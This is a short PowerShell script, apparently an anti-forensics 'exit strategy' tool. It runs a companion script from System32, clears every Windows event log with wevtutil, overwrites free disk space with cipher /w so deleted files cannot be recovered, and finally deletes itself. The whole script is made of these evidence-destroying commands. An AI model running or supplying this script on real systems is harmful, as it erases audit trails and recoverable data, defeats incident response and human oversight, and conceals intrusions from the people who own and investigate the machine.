# starts exitstrategy.ps1
& "C:\Windows\System32\exitstrategy.ps1"
# clears event log
wevtutil el | Foreach-Object {wevtutil cl "$_"}
# overwrite deleted data
cipher /w:c:\
# self destructs file
Remove-Item -Path $MyInvocation.MyCommand.Source -Force
